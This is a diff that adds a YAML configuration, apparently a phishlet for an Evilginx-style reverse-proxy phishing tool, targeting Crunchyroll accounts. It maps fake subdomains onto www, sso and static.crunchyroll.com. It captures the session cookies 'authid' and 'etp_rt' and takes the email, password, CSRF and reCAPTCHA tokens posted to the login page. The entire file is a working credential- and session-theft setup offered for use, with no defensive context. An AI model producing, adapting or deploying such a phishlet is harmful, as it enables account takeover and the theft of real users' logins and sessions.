@@ -1,0 +1,33 @@
+author: '@0x0ASAUJSAIS'
+min_ver: '3.0.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'crunchyroll.com', session: true, is_landing: true}
+  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'crunchyroll.com', session: false, is_landing: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'static.crunchyroll.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.crunchyroll.com', orig_sub: 'www', domain: 'crunchyroll.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.crunchyroll.com', orig_sub: 'sso', domain: 'crunchyroll.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.crunchyroll.com', orig_sub: 'static', domain: 'static.crunchyroll.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+auth_tokens:
+  - domain: '.crunchyroll.com'
+    keys: ['authid', 'etp_rt']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  csrf_token:
+    key: 'csrf_token'
+    search: '(.*)'
+    type: 'post'
+  recaptcha_token:
+    key: 'recaptcha_token'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'sso.crunchyroll.com'
+  path: '/login'
